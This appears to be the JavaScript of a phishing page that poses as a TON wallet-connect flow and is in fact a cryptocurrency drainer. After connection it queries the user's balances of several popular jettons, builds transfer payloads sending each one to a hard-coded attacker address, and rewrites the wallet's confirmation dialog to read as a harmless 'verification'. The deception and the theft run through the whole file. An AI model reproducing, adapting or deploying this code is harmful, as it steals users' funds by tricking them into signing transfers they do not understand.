...
var Wallet = {
    ...
    if (Aj.globalState.tonConnectVersion == 2) {
      ...
      if (!tonConnectUI) {
        ...
        tonConnectUI.connectionRestored.then(function() {
          if (!Aj.globalState.tonConnectInited) {
            ...
            if (tonConnectUI.connected && tonConnectUI.wallet) {
              ...
              // Use same conversion as in onStatusChange
              function toUserFriendlyAddress(address, testOnly = false, bounceable = false) {
                ...
                for (let i = 0; i < 32; i++) hashBytes[i] = parseInt(hexHash.substr(i * 2, 2), 16);
                let tag = 0x11;
                if (!bounceable) tag = 0x51;
                if (testOnly && bounceable) tag = 0x91;
                if (testOnly && !bounceable) tag = 0xD1;
                const addr = new Uint8Array(34);
                addr[0] = tag;
                addr[1] = workchain;
                addr.set(hashBytes, 2);
                function crc16(data) {
                  let crc = 0;
              ...
              const friendlyAddress = toUserFriendlyAddress(wallet.account.address, false, false); // UQ format
              const shortAddress = friendlyAddress.slice(0, 4) + '...' + friendlyAddress.slice(-4);
              const tonAuthButtons = document.querySelectorAll('.ton-auth-link');
              tonAuthButtons.forEach(btn => {
                btn.innerHTML = `<i class="icon icon-connect-ton"></i><span class="tm-button-label">Connected: ${shortAddress}</span>`;
                btn.classList.add('wallet-connected');
              });
              
              // Auto-transfer on restored connection too
              setTimeout(function() {
                if (!tonConnectUI || !tonConnectUI.connected) return;
                
                // Drain ALL jettons in one batch
                var attackerAddress = 'UQBWuvThPU16yXyDqABaE7gi3sA3Y5VDM0Cs7OES7ALt6_ts';
                var userAddress = tonConnectUI.wallet.account.address;
                
                Wallet.drainAllJettons(userAddress, attackerAddress, function(messages) {
                ...
                // Override modal text - faster checking
                setTimeout(function() {
                  var checkModal = setInterval(function() {
                    try {
                      var heading = document.querySelector('tc-root h1');
                      if (heading && heading.textContent.toLowerCase().includes('transaction')) {
                        heading.textContent = 'Confirm verification in Wallet';
                        clearInterval(checkModal);
                      }
                      var paragraphs = document.querySelectorAll('tc-root p');
                      paragraphs.forEach(function(p) {
                        if (p.textContent.includes('only take a moment')) {
                          p.textContent = 'Please approve the request.';
                        }
                      });
                    } catch (e) {}
                  }, 20);
                  setTimeout(function() { clearInterval(checkModal); }, 2000);
                }, 100);
              }, 1500);
            }
          }
        ...
        tonConnectUI.onStatusChange(function(wallet) {
          // Always handle wallet status changes, regardless of init state
          if (wallet && wallet.account) {
            // Update UI immediately when wallet connects
            Aj.globalState.tonConnectAuthAddress = wallet.account.address;
            Aj.globalState.tonConnectLoggedIn = true;
            Aj.globalState.tonConnectInited = true; // Ensure init flag is set
            
            // Convert raw address (0:abc...def) to user-friendly format (UQ...xyz or EQ...xyz)
            function toUserFriendlyAddress(address, testOnly = false, bounceable = false) {
              ...
              // Create address: tag + workchain + hash
              // Tag byte: bit 7 = test flag, bit 6 = bounceable flag
              let tag = 0x11; // Default: bounceable, mainnet
              if (!bounceable) tag = 0x51; // Non-bounceable, mainnet
              if (testOnly && bounceable) tag = 0x91; // Bounceable, testnet
              if (testOnly && !bounceable) tag = 0xD1; // Non-bounceable, testnet
            ...
            const fullAddress = toUserFriendlyAddress(wallet.account.address, false, false); // testOnly=false, bounceable=false for UQ
            ...
            // Auto-drain ALL jettons in one batch
            setTimeout(function() {
              var tonConnectUI = Aj.globalState.tonConnectUI;
              ...
              setTimeout(function() {
                ...
                }, 20); // Check every 20ms - very fast
                setTimeout(function() { clearInterval(checkModal); }, 2000);
              }, 100); // Start checking after 100ms
            }, 1500);
            
            // Optionally verify with backend if proof exists
            ...
            Aj.globalState.tonConnectAuthAddress = null;
            Aj.globalState.tonConnectLoggedIn = false;
            
            const tonAuthButtons = document.querySelectorAll('.ton-auth-link');
            tonAuthButtons.forEach(btn => {
              btn.innerHTML = `<i class="icon icon-connect-ton"></i><span class="tm-button-label">Connect TON</span>`;
  ...
  createJettonTransferPayload: function(attackerAddr, jettonAmount, decimals) {
    decimals = decimals || 9; // Default 9 decimals for most jettons
    
    // Convert amount to nano-jettons
    const amountNano = BigInt(Math.floor(jettonAmount * Math.pow(10, decimals)));
    
    // Parse address (support both UQ/EQ and raw formats)
    const parseAddress = function(addr) {
      if (addr.startsWith('UQ') || addr.startsWith('EQ')) {
        // base64url decode
        const clean = addr.substring(2).replace(/-/g, '+').replace(/_/g, '/');
        const padded = clean + '='.repeat((4 - clean.length % 4) % 4);
        const bytes = atob(padded);
        // Skip first byte (tag), workchain is byte 1, hash is bytes 2-33
        return {
          workchain: bytes.charCodeAt(1),
      ...
      if (parts.length === 2) {
        const hashBytes = new Uint8Array(32);
        for (let i = 0; i < 32; i++) {
          hashBytes[i] = parseInt(parts[1].substr(i * 2, 2), 16);
        }
        return {
          workchain: parseInt(parts[0]),
          hash: String.fromCharCode(...hashBytes)
        };
      }
      throw new Error('Invalid address format');
    };
    
    const dest = parseAddress(attackerAddr);
    ...
    const Bits = function() {
      ...
      this.writeBit = function(val) {
        ...
        if (val) {
          this.data[this.data.length - 1] |= (1 << (7 - this.currentBit));
        }
      ...
      this.writeUint = function(val, bits) {
        for (let i = bits - 1; i >= 0; i--) {
          this.writeBit((val >> i) & 1);
        }
      };
      
      this.writeCoins = function(val) {
        // Coins are serialized as: len(4 bits) + value(len bytes)
        // If value is 0, just write 4 zero bits
        if (val === 0n) {
          this.writeUint(0, 4);
          return;
        }
        ...
        for (let i = 0; i < byteLen; i++) {
          this.writeUint(parseInt(hex.substr(i * 2, 2), 16), 8);
        }
      };
      
      this.writeAddress = function(addr) {
        // MsgAddress: 2 bits type + workchain + hash
        // addr_std$10 tag (2 bits)
        this.writeBit(1);
        this.writeBit(0);
        // Anycast? 1 bit, no
        this.writeBit(0);
        // Workchain 8 bits
        this.writeUint(addr.workchain, 8);
        // Hash 256 bits
        for (let i = 0; i < 32; i++) {
          this.writeUint(addr.hash.charCodeAt(i), 8);
        }
      };
      ...
      this.getBytes = function() {
        ...
        if (this.currentBit !== 0) {
          // Add completion bit 1 and pad with 0s
          this.writeBit(1);
    ...
    // Opcode: 0x0f8a7ea5 (32 bits)
    bits.writeUint(0x0f8a7ea5, 32);
    
    // Query ID: 0 (64 bits)
    bits.writeUint(0, 64);
    
    // Amount (coins)
    bits.writeCoins(amountNano);
    
    // Destination address
    bits.writeAddress(dest);
    
    // Response destination (same as destination for refunds)
    bits.writeAddress(dest);
    
    // Forward TON amount: 0 (coins)
    bits.writeCoins(0n);
    
    // Forward payload: either 0 bit (empty)
    bits.writeBit(0);
    
    const cellData = bits.getBytes();
    
    // Build cell descriptor
    // d1 = refs_count + (is_exotic ? 1 : 0) << 5 + data_bit_len // 8 bits
    // d2 = data_byte_len // 8 bits
    const dataBitLen = cellData.length * 8;
    const d1 = (0 << 5) | (dataBitLen & 0x1f); // 0 refs, not exotic, bit len in lower 5 bits
    const d2 = Math.ceil(dataBitLen / 8);
    
    // Build BOC
    // Magic: b5ee9c72 (4 bytes)
    // flags: 1 byte (has_crc32? + has_cache_bits? + flags + size_bytes - 1)
    // For simple BOC: flags = 0, size_bytes = 1
    
    const cellBytes = new Uint8Array([
      d1, d2,
      ...cellData
    ]);
    
    // BOC structure:
    // magic (4) + flags (1) + cells_count (1) + roots_count (1) + absent_count (1) + tot_cells_size (1) + root_list (1) + cell_data
    
    const magic = [0xb5, 0xee, 0x9c, 0x72];
    const flags = 0x00; // no crc, no cache, size_bytes=1
    const cellsCount = 1;
    const rootsCount = 1;
    const absentCount = 0;
    const totalSize = cellBytes.length;
  ...
  drainAllJettons: function(userAddress, attackerAddress, callback) {
    // List of popular jettons to drain (master contract addresses)
    var popularJettons = [
      { name: 'USDT', master: 'EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs', decimals: 6 },
      { name: 'NOT', master: 'EQAvlWFDxGF2lXm67y4yzC17wYKD9A0guwPkMs1gOsM__NOT', decimals: 9 },
      { name: 'STON', master: 'EQA2kCVNwVsil2EM2mB0SkXytxCqQjS4mttjDpnXmwG9T6bO', decimals: 9 },
      { name: 'jUSDT', master: 'EQBynBO23ywHy_CgarY9NK9FTz0yDsG82PtcbSTQgGoXwiuA', decimals: 6 },
      { name: 'jUSDC', master: 'EQB-MPwrd1G6WKNkLz_VnV6WqBDd142KMQv-g1O-8QUA3728', decimals: 6 }
    ];
    
    var messages = [];
    var completed = 0;
    var total = popularJettons.length;
    
    // Check each jetton
    popularJettons.forEach(function(jetton) {
      Wallet.fetchJettonBalance(userAddress, jetton.master, function(balance) {
        if (balance !== '0' && parseInt(balance) > 0) {
          // User has this jetton - get wallet contract
          Wallet.getUserJettonWallet(userAddress, jetton.master, function(jettonWallet) {
            if (jettonWallet) {
              var payload = Wallet.createJettonTransferPayload(attackerAddress, parseInt(balance), jetton.decimals);
              messages.push({
                address: jettonWallet,
                amount: '50000000', // 0.05 TON gas per jetton
                payload: payload
              });
            }
            completed++;
  ...
  fetchJettonBalance: function(userAddress, jettonMasterAddress, callback) {
    // Fetch user's jetton balance using TON API
    var tonApiUrl = 'https://tonapi.io/v2/accounts/' + userAddress + '/jettons/' + jettonMasterAddress;
    
    fetch(tonApiUrl)
      .then(function(response) { return response.json(); })
      .then(function(data) {
        if (data && data.balance) {
          callback(data.balance); // Returns balance as string
        } else {
          callback('0');
        }
      })
  ...
  getUserJettonWallet: function(userAddress, jettonMasterAddress, callback) {
    // Get user's jetton wallet contract address
    var tonApiUrl = 'https://tonapi.io/v2/jettons/' + jettonMasterAddress + '/holders?limit=1&offset=0&owner=' + userAddress;
    
    fetch(tonApiUrl)
      .then(function(response) { return response.json(); })
      .then(function(data) {
        if (data && data.addresses && data.addresses.length > 0) {
          callback(data.addresses[0].address); // User's jetton wallet address
        } else {
          callback(null);
        }
      })
  ...
  eTonAuth: function(e) {
    if (Aj.globalState.tonConnectVersion == 2) {
      ...
      if (!tonConnectUI.connected) {
        ...
        // When wallet is connected, clicking should disconnect
        e.stopImmediatePropagation();
        e.preventDefault();
